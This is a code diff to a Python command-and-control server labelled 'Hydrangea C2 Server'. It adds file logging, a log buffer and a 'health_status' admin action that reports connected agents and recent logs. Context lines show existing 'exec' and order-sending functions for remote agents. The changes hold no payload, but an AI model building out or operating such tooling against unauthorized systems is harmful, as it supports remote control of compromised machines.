@@ -6,6 +6,7 @@ import logging
 import os
 import uuid
 from typing import Dict, Any
+import logging.handlers
 
 from server.common import read_frame, write_frame, ProtocolError, safe_join
 
@@ -13,6 +14,10 @@ logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s %(levelname)s %(name)s: %(message)s",
 )
+file_handler = logging.FileHandler("hydrangea_server.log")
+file_handler.setLevel(logging.INFO)
+file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
+logging.getLogger().addHandler(file_handler)
 log = logging.getLogger("hydrangea.server")
 
 
@@ -34,6 +39,10 @@ class Server:
         self.clients: Dict[str, ClientSession] = {}
         self.servers: list[asyncio.base_events.Server] = []
         self.pending: Dict[str, asyncio.Future] = {}
+        self.log_buffer = logging.handlers.MemoryHandler(
+            capacity=100, target=None
+        )
+        logging.getLogger().addHandler(self.log_buffer)
 
     async def start(self):
         print
@@ -210,6 +219,18 @@ class Server:
                 log.warning(f"Failed to send order to {session.client_id}: {e}")
                 break
 
+    def get_health_status(self):
+        """Generate the server's health status."""
+        log_entries = []
+        for record in self.log_buffer.buffer:
+            log_entries.append(self.log_buffer.format(record))
+
+        return {
+            "status": "running",
+            "connected_agents": len(self.clients),
+            "recent_logs": log_entries[-10:],  # Last 10 log entries
+        }
+
     async def handle_admin(
         self,
         reader: asyncio.StreamReader,
@@ -227,6 +248,7 @@ class Server:
             "clients",
             "exec",
             "session_info",
+            "health_status",
         }:
             await write_frame(
                 writer, {"type": "ERROR", "error": "unknown_admin_action"}
@@ -250,6 +272,13 @@ class Server:
                 session = self.clients[target]
                 await write_frame(session.writer, {"type": "PING"})
                 await write_frame(writer, {"type": "OK"})
+            writer.close()
+            await writer.wait_closed()
+            return
+
+        if action == "health_status":
+            health_status = self.get_health_status()
+            await write_frame(writer, {"type": "HEALTH_STATUS", **health_status})
             writer.close()
             await writer.wait_closed()
             return
@@ -421,7 +450,7 @@ art = r"""
   ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀        ▄████████▀    ██████████   ███    ███  ▀██████▀    ██████████   ███    ███ 
                                       ███    ███                                                                                                ███    ███                           ███    ███ 
 
-              Hydrangea C2 Server  •  V1.1
+              Hydrangea C2 Server  •  V1.2
 """
 
 
